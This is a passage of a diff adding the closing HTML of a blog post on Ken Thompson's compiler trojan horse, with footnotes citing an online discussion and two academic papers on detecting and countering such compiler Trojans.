+<div class="footnote-definition" id="6"><sup class="footnote-definition-label">6</sup>
+<p>Skeptics Stack Exchange: <a href="https://skeptics.stackexchange.com/questions/6386/was-the-c-compiler-trojan-horse-written-by-ken-thompson-ever-distributed">"Was the C compiler trojan horse written by Ken
+Thompson ever
+distributed?"</a></p>
+</div>
+<div class="footnote-definition" id="7"><sup class="footnote-definition-label">7</sup>
+<p>McDermott, J. (1988, October). A technique for removing an important class
+of Trojan horses from high order languages. In Proc. 11th National Computer
+Security Conference (pp. 114-117). <a href="https://apps.dtic.mil/sti/tr/pdf/ADA462303.pdf">https://apps.dtic.mil/sti/tr/pdf/ADA462303.pdf</a></p>
+<p>This paper, published in 1988, demonstrates a means of preventing the
+"Trojan horse," as well as outlining some practical issues of implementing
+such a system.</p>
+</div>
+<div class="footnote-definition" id="8"><sup class="footnote-definition-label">8</sup>
+<p><a href="https://dwheeler.com/trusting-trust/wheelerd-trust.pdf">Countering Trusting Trust through Diverse Double-Compiling
+(DDC)</a>, David A.
+Wheeler, Proceedings of the Twenty-First Annual Computer Security
+Applications Conference (ACSAC), December 5-9, 2005, Tucson, Arizona, pp.
+28-40, Los Alamitos: IEEE Computer Society. ISBN 0-7695-2461-3, ISSN
+1063-9527, IEEE Computer Society Order Number P2461.</p>
+</div>
+
+
+        
+    </article>
+
+    <!-- Comment section -->
+    
+      
+        
+          <script
+  src="https://giscus.app/client.js"
+  data-repo="micahkepe&#x2F;blog"
+  data-repo-id="R_kgDONfHznQ"
+  data-category="General"
+  data-category-id="DIC_kwDONfHznc4CnQJ4"
+  data-mapping="pathname"
+  data-strict="0"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="bottom"
+
+  
+  data-theme="preferred_color_scheme"
+  
+
+  data-lang="en"
+  data-loading="lazy"
+  crossorigin="anonymous"
+  async
+></script>
+
+        
+      
+    
+
+
+    <!-- Page footer -->
+    
+    <footer>
+        <hr>
+        <p>
+            
+                Published by Micah Kepe
+            
+            
+                
+                in <a href="https://micahkepe.com/blog/categories/programming/">programming</a>
+            
+            
+                and
+                tagged
+                
+                    <a href="https://micahkepe.com/blog/tags/infosec/">infosec</a>
+                    
+                
+            
+        </p>
+
+        <!-- Revision history (optional) -->
+        
+          
+            
+              
+                
+                
+                <section class="revision-history">
+                  <a href="https:&#x2F;&#x2F;github.com&#x2F;micahkepe&#x2F;blog&#x2F;commits&#x2F;main&#x2F;content&#x2F;thompson-trojan-horse&#x2F;index.md" target="_blank" rel="noopener noreferrer">
+                    (revision history)
+                  </a>
+                </section>
+              
+            
+          
+        
+
+        
+        
+    </footer>
+
+
+</article>
+
+
+    </main>
+    
+
+
+
+
+
+  </body>
+</html>
